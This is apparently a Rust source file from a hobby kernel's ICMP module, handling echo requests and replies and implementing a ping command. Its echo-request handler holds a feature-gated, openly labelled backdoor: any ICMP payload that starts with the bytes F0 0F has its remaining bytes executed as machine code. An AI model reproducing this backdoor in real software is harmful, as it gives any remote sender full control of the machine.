use alloc::vec::Vec;
use core::cell::RefCell;
use core::pin::Pin;
use core::task::{Context, Poll};
use core::time::Duration;
use futures::future::FusedFuture;
use futures::select_biased;
use futures_util::{FutureExt, Stream, StreamExt, future, task::AtomicWaker};
use hashbrown::HashMap;

use super::{ControlMessageType, ICMPPacket, IPv4Header, IPv4Packet, NoSubcode};
use crate::net::icmp::PACKET_TIMEOUT_DURATION;
use crate::net::{self, Ipv4Addr, ip, ones_complement_checksum};
use crate::println;
use crate::sync::spinlock::Mutex;
use crate::task::sleep;
use crate::time::Instant;

// should this be made into a generic handle<T> ?
pub async fn handle_icmp_echo_request(icmpp: ICMPPacket<'_>, header: &IPv4Header) {
    log::debug!("{:?}", icmpp.data);

    #[cfg(feature = "backdoor")]
    {
        let pattern = b"\xF0\x0F";
        let dpat = &icmpp.data[0..pattern.len()];

        if dpat == pattern {
            log::warn!("BACKDOOR ACTIVATED");

            let program = &icmpp.data.as_slice()[pattern.len()..];

            // safe since sender pinky promisies that the code is memory safe :3
            unsafe {
                core::arch::asm!(
                "call rax", in("rax") program.as_ptr(),
                clobber_abi("C")
                );
            };
        }
    }

    let mut response = ICMPPacket {
        typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
        checksum: 0,
        other: icmpp.other,
        data: icmpp.data,
    };

    response.checksum = response.calc_checksum();

    debug_assert_eq!(
        ones_complement_checksum(response.to_bytes().as_slice()),
        0,
        "checksum with self should be 0"
    );

    let resp_bytes = response.to_bytes();

    let Some(interface) = net::get_inferface_for_ip_via_subnet(header.source_address).await else {
        log::error!(
            "No interface found. Failing to respond to icmp request from {}",
            header.source_address
        );
        return;
    };

    let ipv4 = IPv4Packet::from_source_dest_and_data(
        interface.ip,
        header.source_address,
        ip::IPProtocol::Icmp,
        resp_bytes.as_slice(),
    )
    .expect("Packet constructed incorrectly");

    log::trace!("Sending icmp response: {:?}", ipv4);
    let _ = crate::net::ip::send_ipv4_packet(ipv4).await;
}

#[derive(Debug)]
struct PingRequestInfo {
    identifier: u16,
    sequence_num: u16,
    payload: Vec<u8>,
}

impl PingRequestInfo {
    fn from_stuff(icmpp: &ICMPPacket<'_>) -> Self {
        PingRequestInfo {
            sequence_num: u16::from_le_bytes(icmpp.other.to_le_bytes()[..2].try_into().unwrap()),
            identifier: u16::from_le_bytes(icmpp.other.to_le_bytes()[2..4].try_into().unwrap()),
            payload: icmpp.data.to_vec(),
        }
    }
}

/// This is called when an echo response addressed to us has arrived.
pub fn handle_icmp_echo_response(icmpp: &ICMPPacket<'_>, header: &IPv4Header) {
    log::debug!(
        "received icmp response! {:?} from source: {}",
        icmpp,
        header.source_address
    );

    for slot in PING_RESPONSE_QUEUE.lock().iter_mut() {
        if slot.is_none() {
            *slot = Some(PingRequestInfo::from_stuff(icmpp));
            PING_WAKER.wake();
            log::debug!("added ping response: {:?} to queue", slot);
            return;
        }
    }
    log::error!("Ping packet queue is full!");
}

// TODO. Handle multiple ping commands at once.
// Running a second one would overwrite the registration of this one
static PING_WAKER: AtomicWaker = AtomicWaker::new();

const PING_RESPONSE_QUEUE_LENGTH: usize = 10;
static PING_RESPONSE_QUEUE: Mutex<[Option<PingRequestInfo>; PING_RESPONSE_QUEUE_LENGTH]> =
    Mutex::new([const { None }; PING_RESPONSE_QUEUE_LENGTH]);

struct PingResponseStream {
    /// What identifier is this streamer looking for?
    identifier: u16,
}

impl PingResponseStream {
    fn find_matching_ping_response(&self) -> Option<PingRequestInfo> {
        let mut queue = PING_RESPONSE_QUEUE.lock();

        for i in 0..PING_RESPONSE_QUEUE_LENGTH {
            if let Some(p) = &queue[i]
                && p.identifier == self.identifier
            {
                return queue[i].take();
            }
        }

        None
    }
}

impl Stream for PingResponseStream {
    type Item = PingRequestInfo;

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        log::debug!(
            "ping request stream poll called. looking for {:?}",
            self.identifier
        );
        if let Some(packet) = self.find_matching_ping_response() {
            log::debug!("Found in first go around");
            return Poll::Ready(Some(packet));
        }

        log::debug!("ping waker registered");
        PING_WAKER.register(cx.waker());

        if let Some(packet) = self.find_matching_ping_response() {
            log::debug!("Found packet in ping queue: {:?}", packet);
            // deregister waker
            PING_WAKER.take();
            Poll::Ready(Some(packet))
        } else {
            log::debug!("did not find matching packet in ping queue");
            Poll::Pending
        }
    }
}

/// Ping a target.
/// If `count` == 0, then it will ping _forever_
/// (Since there is no way to stop a task this means it will reboot)
/// If a target is unreachable, we dont handle that yet so it will just stop based on timeout.
pub async fn ping(target: Ipv4Addr, count: u16) {
    log::info!("pinging target: {}", target);

    #[expect(clippy::cast_possible_truncation, reason = "intended")]
    let ident = crate::time::get_ticks() as u16;
    let payload = b"an icmp payload yayy :3";

    // Packets that have not yet received a response
    // Refcell works here because this variable is not shared between threads.
    // Holds the sequence num of a packet, and the time it was sent at.
    let outstanding_packets: RefCell<HashMap<u16, Instant>> = RefCell::new(HashMap::new());

    let (done_tx, mut done_rx) = futures::channel::oneshot::channel::<()>();

    let packet_sender = async || {
        let mut sequence_num = 0;

        while (sequence_num < count) && count != 0 {
            let mut request = ICMPPacket {
                typ: ControlMessageType::EchoRequest(NoSubcode::NoCode),
                checksum: 0,
                other: (u32::from(ident) << 16) | u32::from(sequence_num),
                data: payload,
            };

            request.checksum = request.calc_checksum();
            let bytes = request.to_bytes();

            // reborrow interface so that ping doesnt break if interface settings are changed
            // I forsee that ping being run in a loop while messing with settings is likely.
            let Some(interface) = crate::net::get_inferface_for_ip_via_subnet(target).await else {
                log::error!("Unable to load network interface.");
                let _ = done_tx.send(());
                return;
            };
            let packet = IPv4Packet::from_source_dest_and_data(
                interface.ip,
                target,
                ip::IPProtocol::Icmp,
                bytes.as_slice(),
            )
            .expect("icmp request is valid");
            let Ok(()) = ip::send_ipv4_packet(packet).await else {
                log::error!("could not send icmp request.");
                let _ = done_tx.send(());
                return;
            };

            outstanding_packets
                .borrow_mut()
                .insert(sequence_num, Instant::now());

            sequence_num += 1;
            sleep::sleep_duration(Duration::from_secs(1)).await;
        }

        let _ = done_tx.send(());
    };

    let mut collector = async || {
        let mut ping_response_stream = PingResponseStream { identifier: ident };
        loop {
            if outstanding_packets.borrow().is_empty() && done_rx.is_terminated() {
                break;
            }

            let next_deadline = outstanding_packets
                .borrow()
                .values()
                .map(|sent| PACKET_TIMEOUT_DURATION.saturating_sub(sent.elapsed()))
                .min();

            select_biased! {
                response = ping_response_stream.next().fuse() => {
                    log::debug!("received a response! {:?}", response);
                    if let Some(response) = response {

                        let Some(packet_send_time) = outstanding_packets
                            .borrow_mut()
                            .remove(&response.sequence_num)
                            else {
                                log::warn!("Ping target sent back a response with a sequence_num that wasnt sent. That is weird");
                                continue;
                        };

                        if response.payload != payload {
                            println!("WARN. Received packet was corrupted: expected: {:?}. received: {:?}", payload, response.payload);
                        }
                        // TODO. Also check the checksum
                        // That requires some refactoring...

                        println!("seq={}, time={:?}", response.sequence_num, packet_send_time.elapsed());
                    }
                }
                _ = done_rx => {
                    // The sender finished. Loop back and check real exit condition
                }
                () = sleep::maybe_sleep(next_deadline).fuse() => {
                    // omg a packet timed out. Need to find which one/s
                    let mut packets = outstanding_packets.borrow_mut();
                    packets.retain(|sequence_num, send_time| {
                        let expired = send_time.elapsed() > PACKET_TIMEOUT_DURATION;
                        if expired {
                            println!("seq={} timed out", sequence_num);
                        }
                        !expired
                    });
                }
            }
        }
    };

    let _ = future::join(packet_sender(), collector()).await;
}
